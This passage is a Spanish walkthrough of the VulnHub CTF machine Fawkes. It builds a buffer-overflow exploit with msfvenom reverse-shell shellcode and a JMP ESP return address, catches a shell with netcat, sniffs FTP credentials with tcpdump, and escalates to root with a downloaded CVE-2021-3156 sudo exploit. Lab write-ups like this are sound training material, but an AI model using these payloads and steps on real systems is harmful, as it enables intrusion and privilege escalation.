[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
Con eso, confirmamos la cantidad del **offset**.

#### Sexto Paso: Identificando Ubicación de Representación de Caracteres {#identificacion}

Estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se puede dirigir el **Buffer Overflow**:
* *EIP*: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
* *EAX*: almacena temporalmente cualquier dirección de retorno.
* *EBX*: almacena datos y direcciones de memoria.
* *ESI*: contiene la dirección de memoria de los datos de entrada.
* *ESP*: se usa para referenciar el inicio de un hilo.
* *EBP*: indica la dirección de memoria del final de un hilo.

Más específicos, nos interesan estos dos: **EIP y EBP**.

Podemos confirmar que, después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres. 

Con **Python**, podemos generar varios caracteres para cumplir con el **offset**, sobreescribir el **EIP** y registrar n cantidad de caracteres después:
```bash
python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
```

Con **gdb**, ejecuta el binario y manda el payload para ver la respuesta: 
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce50  →  0x0000000a ("\n"?)
$edx   : 0xffffcc94  →  0x0000000a ("\n"?)
$esp   : 0xffffcc30  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"    ← $esp
0xffffcc34│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc38│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc3c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc40│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc44│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc48│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc4c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────
```
Excelente, observa que ahí están las **4 B's** que creamos con el payload dentro del **EIP** y después quedan registradas las **C's**.

Puedes ver que el **ESP** (el inicio de la pila) igual ya tiene las **C's**, lo que quiere decir que aquí es donde podemos meter el **Shellcode**.

Además, podemos inspeccionar el **ESP** desde **gdb** para comprobar lo del **ESP**:
```bash
gef➤  x/35wx $esp-5
0xffffcc2b:     0x42424241      0x43434342      0x43434343      0x43434343
0xffffcc3b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc4b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc5b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc6b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc7b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc8b:     0x43434343      0x43434343      0x00000a43      0x00000000
0xffffcc9b:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffccab:     0x6c655700      0x656d6f63      0x206f7420
```
Con esto comprobamos que el **EIP** empieza con las **B's** y luego comienza el **ESP** que vale las **C's**.

#### Séptimo Paso: Creación de Shellcode y Creación de Exploit {#shellcodeExploit}

Vamos muy bien, ahora podemos comenzar a crear nuestro Exploit en **Python**.

Primero crearemos el **Shellcode** que será una **Reverse Shell** con **msfvenom**.

Puedes crearlo para probarlo contra tu máquina o de una vez hacerlo para atacar el binario de la máquina víctima, pero en mi caso, lo haré para mi máquina:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xdb\...
...
...
```
Le indicamos a **msfvenom** lo siguiente:
* Crear una **Reverse Shell** para **arquitectura x86**.
* Mi IP y un puerto al que será dirigido.
* Que elimine el **byte nulo (\x00)**, ya que puede darnos conflicto con el binario, pues esta hecho con **lenguaje C**.
* Crear el formato del payload en **Python**
* Especificamos el nombre de la variable que almacena el payload como **Shellcode**.

Ahora, empezamos a crear nuestro Exploit con **Python**, siendo muy similar al script **spiker.py**:
```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "127.0.0.1 o VíctimaIP"
port = 9898
offset = 112
before_eip = b"A"*offset
eip = b"B"*4

shellcode =  b""
shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
...
...
...

after_eip = shellcode

payload = before_eip + eip + after_eip

# Creando conexión y enviando shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_addr, port))
s.send(payload)
s.close()
```
Así va quedando nuestro script, pero aún faltan cosas por completar en los siguientes pasos.

#### Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP {#OpCode}

¿Qué es un **OpCode**?

| **Operation Code** |
|:-----------:|
| *El opcode (abreviatura de "operation code" o código de operación) es una parte fundamental de una instrucción en lenguaje máquina. Es el segmento de la instrucción que le dice a la CPU qué operación debe realizar.* |

Entonces, necesitamos buscar un **OpCode** dentro del binario que nos ayude a escribir nuestro **Shellcode** para que se pueda ejecutar la **Reverse Shell**.

Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el **Shellcode**. Esto se le conoce como **JMP ESP**

Una herramienta que podemos ocupar es **nasm_shell** de **Metasploit Framework**.

Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque él `JMP ESP`:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
```
El **OpCode** se representa así: `\xFF\xE4`.

Ahora, podemos buscarlo dentro del binario con la herramienta **objdump** y con **grep** buscamos el **OpCode**:
```bash
objdump -D server_hogwarts| grep "ff e4"
 8049d55:       ff e4                   jmp    *%esp
 80b322c:       81 73 f6 ff e4 73 f6    xorl   $0xf673e4ff,-0xa(%ebx)
 80b3253:       ff 91 73 f6 ff e4       call   *-0x1b00098d(%ecx)
 80b500f:       ff e4                   jmp    *%esp
 80b51ef:       ff e4                   jmp    *%esp
 80b546f:       ff e4                   jmp    *%esp
 80d0717:       ff e4                   jmp    *%esp
```
Se puede ocupar cualquiera que sea **JMP ESP**.

Lo puedes agregar de una vez al Exploit, pero el **OpCode** debe ir en formato **Little Endian** que básicamente es ponerlo de atrás hacia adelante de la siguiente forma:
```bash
\x55\x9d\x04\x08 -> JMP ESP 8049d55
```

Se agregaría en la variable **eip**:
```python
eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55
```

Vayamos al siguiente paso.

#### Noveno Paso: Aplicando NOPs en Exploit {#NOPs}

¿Qué son los **NOPs**?

| **No Operation (NOPs)** |
|:-----------:|
| *Los NOPs (del inglés No Operation, "sin operación") son instrucciones en lenguaje máquina o ensamblador que no realizan ninguna acción útil, excepto avanzar al siguiente ciclo de la CPU. Permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.* |

Es muy simple, únicamente debemos agregar la siguiente instrucción que es para **arquitectura x86**:
```bash
b"\x90"
```
El **NOP**, se puede multiplicar por 16 o por 32, pero en nuestro caso, al no tener tantas instrucciones, podemos multiplicarlo por 16.

Esto lo podemos agregar al Exploit en la variable **after_eip** junto al **Shellcode**:
```python
after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode
```
Sigamos.

#### Décimo Paso: Prueba y Ejecución de Exploit {#Exploit}

Con los datos que ya hemos obtenido, nuestro Exploit debería quedar así:
```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "127.0.0.1 o VíctimaIP"
port = 9898

def exploit(ip_addr, port):

        offset = 112

        before_eip = b"A" * offset  # Limite de binario

        eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55

        shellcode =  b""
        shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
	...
	...
	...

        after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode

        payload = before_eip + eip + after_eip

        try:
                # Creando conexión y enviando shellcode
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"\n[+] Conectando a {ip_addr}:{port}...\n")
                s.connect((ip_addr, port))

                # Enviando payload
                s.send(payload)
                print(f"\n[*] Payload lanzado: {payload}")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
        finally:
                s.close()
                print("\n[+] Cerrando conexión.")

if __name__ == '__main__':
        exploit(ip_addr, port)
```
Lo estructure mejor para que maneje errores como el **spiker.py**.

Ahora, podemos probarlo con nuestra máquina, aunque debo decir que debe ser ejecutado varias veces para poder obtener una shell.

Abre una **netcat** y ejecuta el Exploit hasta obtener la shell:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [Tu_IP] 40950
whoami
root
ls
exploitMonkeycom.py
server_hogwarts
spiker.py
```

Igual podemos probarlo directamente con la máquina víctima, si es que pusiste su IP en el script.

Abre una **netcat** y ejecuta el Exploit:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.007] 34188
whoami
harry
```
Con esto, hemos ejecutado un **Buffer Overflow** exitosamente.

## Post Explotación {#Post}

### Enumeración de la Máquina {#Enumeracion}

Ya dentro, te diría que obtengas una sesión interactiva, pero no vamos a poder hacerlo.

Así que investiguemos qué nos podemos encontrar.

Nos encontramos en la raíz, pero si vamos al directorio `/home`, encontraremos el directorio de harry y dentro estarán las credenciales de este usuario:
```bash
cd home
ls
harry
cd harry
ls -la
total 60
drwxr-sr-x    1 harry    harry         4096 Nov 17 21:45 .
drwxr-xr-x    1 root     root          4096 Apr 13  2021 ..
lrwxrwxrwx    1 root     harry            9 Apr 13  2021 .ash_history -> /dev/null
-rw-r--r--    1 root     harry           24 Apr 13  2021 .mycreds.txt
-rw-------    1 harry    harry       319488 Nov 17 21:45 core
cat .mycreds.txt
...
```

Podemos probar estas credenciales en el **servicio SSH** del **puerto 2222**:
```bash
ssh harry@192.168.1.007 -p 2222
harry@192.168.1.007's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

2b1599256ca6:~$ whoami
harry
```
Mucho mejor.

Curiosamente, el **prompt** parece ser de un **contenedor Docker**, y lo podemos comprobar si nos vamos a la raíz y vemos todos los archivos:
```bash
2b1599256ca6:/$ ls -la
total 72
drwxr-xr-x    1 root     root          4096 Apr 24  2021 .
drwxr-xr-x    1 root     root          4096 Apr 24  2021 ..
-rwxr-xr-x    1 root     root             0 Apr 24  2021 .dockerenv
drwxr-xr-x    2 root     root          4096 Mar 31  2021 bin
drwxr-xr-x    5 root     root           340 Nov 19 19:31 dev
...
...
...
```

Y también con **ifconfig**:
```bash
2b1599256ca6:~# ifconfig
eth0      Link encap:Ethernet  HWaddr .....  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:410 errors:0 dropped:0 overruns:0 frame:0
          TX packets:282 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:40132 (39.1 KiB)  TX bytes:35218 (34.3 KiB)
...
...
```
Sigamos investigando.

Veamos si tenemos algún privilegio:
```bash
2b1599256ca6:/$ sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
```

Entonces, podemos convertirnos en **Root**:
```bash
2b1599256ca6:/$ sudo su
2b1599256ca6:/# whoami
root
```
Bien.

Vayamos al directorio del **Root**:
```bash
2b1599256ca6:/# cd root
2b1599256ca6:~# ls
horcrux1.txt  note.txt
```

Ya tenemos el primer horocrux:
```bash
horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}
```

Leamos la nota:
```bash
2b1599256ca6:~# cat note.txt 
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
```
Nos están pidiendo que analicemos el tráfico de la red para ver quién se está logueando vía **FTP**.

#### Analizando Tráfico de Red con tcpdump y Ganando Acceso como Usuario neville {#tcpdump}

Primero, veamos si tenemos **tcpdump** en el contenedor:
```bash
2b1599256ca6:~# which tcpdump
/usr/bin/tcpdump
```
Lo tenemos.

Vamos a indicarle que analice el tráfico de la interfaz **eth0** de la máquina y aplicaremos un filtro para que solamente muestre paquetes de **FTP**.

Hay varios filtros que se pueden usar, por ejemplo:
* `port 21`
* `port ftp`
* `port ftp-data`

Justo en **stackoverflow**, alguien tuvo esta duda:
* <a href="https://stackoverflow.com/questions/46631666/how-i-can-to-capture-ftp-data-packets-via-tcpdump" target="_blank">How i can to capture FTP-data packets via tcpdump?</a>

Apliquémoslo:
```bash
2b1599256ca6:~# tcpdump -i eth0 port ftp or ftp-data
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:36:01.145511 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [S], seq 2272672996, win 64240, options [mss 1460,sackOK,TS val 1020873716 ecr 0,nop,wscale 7], length 0
19:36:01.145520 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [S.], seq 2779183984, ack 2272672997, win 65160, options [mss 1460,sackOK,TS val 3164671643 ecr 1020873716,nop,wscale 7], length 0
19:36:01.145533 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 1020873716 ecr 3164671643], length 0
19:36:01.146036 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 3164671644 ecr 1020873716], length 20: FTP: 220 (vsFTPd 3.0.3)
19:36:01.146068 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 0
19:36:01.146119 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 14: FTP: USER neville
19:36:01.146122 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 15, win 510, options [nop,nop,TS val 3164671644 ecr 1020873717], length 0
19:36:01.146142 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 3164671644 ecr 1020873717], length 34: FTP: 331 Please specify the password.
19:36:01.146164 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 1020873717 ecr 3164671644], length 15: FTP: PASS contraseña
19:36:01.187838 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 30, win 510, options [nop,nop,TS val 3164671686 ecr 1020873717], length 0
19:36:03.832622 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 3164674331 ecr 1020873717], length 22: FTP: 530 Login incorrect.
19:36:03.832688 IP 172.17.0.1.49520 > 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 1020876404 ecr 3164674331], length 6: FTP: QUIT
19:36:03.832694 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [.], ack 36, win 510, options [nop,nop,TS val 3164674331 ecr 1020876404], length 0
19:36:03.832714 IP 2b1599256ca6.21 > 172.17.0.1.49520: Flags [P.], seq 77:91, ack 36, win 510, options [nop,nop,TS val 3164674331 ecr 1020876404], length 14: FTP: 221 Goodbye.
```
Tardó alrededor de 1 minuto.

Obtuvimos un usuario y contraseña que podemos probar en el **servicio SSH** del **puerto 22**:
```bash
ssh neville@192.168.1.007
neville@192.168.1.007's password: 
Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
neville@Fawkes:~$ whoami
neville
```

Y aquí podemos encontrar el segundo horocrux:
```bash
neville@Fawkes:~$ cat horcrux2.txt 
horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}
```

### Escalando Privilegios con Binario SUID {#sudo}

Con este usuario, no tendremos privilegios de los que nos podamos aprovechar.

Busquemos si existe un binario con **permisos SUID**:
```bash
neville@Fawkes:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/sudo
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```
Parece que tenemos el binario **sudo**.

Veamos sus permisos:
```bash
neville@Fawkes:~$ ls -la /usr/local/bin
total 1780
drwxr-xr-x  2 root root    4096 Apr  7  2021 .
drwxr-xr-x 11 root root    4096 Apr  7  2021 ..
-rwsr-xr-x  1 root root  581632 Apr  7  2021 sudo
```
El problema es que si lo ejecutamos, nos pedirá que introduzcamos la contraseña del **Root** que no tenemos. Otra opción sería usar **GTFOBins**, pero tampoco nos ayudará en este caso por lo mismo.

Veamos la versión del binario y busquemos un Exploit:
```bash
neville@Fawkes:~$ /usr/local/bin/sudo --version
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
```
Podemos encontrar un Exploit con **searchsploit** para esta versión, pero este no funcionará.

Si buscamos por internet, podemos encontrar estas dos versiones:
* <a href="https://github.com/worawit/CVE-2021-3156" target="_blank">Repositorio de worawit: CVE-2021-3156</a>
* <a href="https://github.com/0xdevil/CVE-2021-3156" target="_blank">Repositorio de 0xdevil: CVE-2021-3156</a>

Cualquiera de los dos funciona, únicamente, tenemos que indicarle la ruta del binario sudo para que funcione.

En mi caso, usaré el primero.

Podemos descargar el script de **Python** que menciona el **GitHub** y probarlo o solamente copiar el código y guardarlo en la máquina víctima.

Por pura práctica, lo haré de la primer forma.

Descargamos el script:
```bash
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py
--2024-11-19 13:46:35--  https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8179 (8.0K) [text/plain]
Saving to: ‘exploit_nss.py’

exploit_nss.py               100%[=======================================>]   7.99K  --.-KB/s    in 0.001s  

2024-11-19 13:46:35 (6.42 MB/s) - ‘exploit_nss.py’ saved [8179/8179]
```

Y lo pasamos a la máquina víctima con **scp**:
```bash
scp exploit_nss.py neville@192.168.1.007:/home/neville
neville@192.168.1.007's password: 
exploit_nss.py
```

Nos logueamos y modificamos el script para que tenga la ruta correcta del binario sudo que vamos a explotar:
```python
SUDO_PATH = b"/usr/local/bin/sudo"
```

Y lo ejecutamos:
```bash
neville@Fawkes:~$ chmod +x exploit_nss.py
neville@Fawkes:~$ python3 exploit_nss.py 
# whoami
root
```

Ya solamente buscamos el último horocrux:
```bash
# cd /root
# ls
horcrux3.txt
# cat horcrux3.txt
__     __    _     _                           _     _     
\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
 \ \ / / _ \| |/ _` |/ _ \ '_ ` _ \ / _ \| '__| __| | / __|
  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \
   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/
                                                           
     _       __            _           _ 
  __| | ___ / _| ___  __ _| |_ ___  __| |
 / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |

| (_| |  __/  _|  __/ (_| | ||  __/ (_| |
 \__,_|\___|_|  \___|\__,_|\__\___|\__,_|
                                         
Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Hard
Machine Name: Fawkes
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Fawkes machine & defeated Voldemort.
Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}

# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```
Con esto, hemos completado la máquina y esta serie de **VulnHub**.

Veamos qué dicen los horocruxes:
```bash
# Horocrux 6:
echo -n "NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=" | base64 -d
6: HaRrY PotTer dEsTrOyed by volDeMorT                                                                                                                                                                                                                 

# Horocrux 7:
echo -n "NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t" | base64 -d
7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom                                                                                                                                                                                                                 

# Horcrux 8:
echo -n "ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==" | base64 -d
8: VolDeMorT dEfeAted bY hArrY PoTTeR
```
Completado.
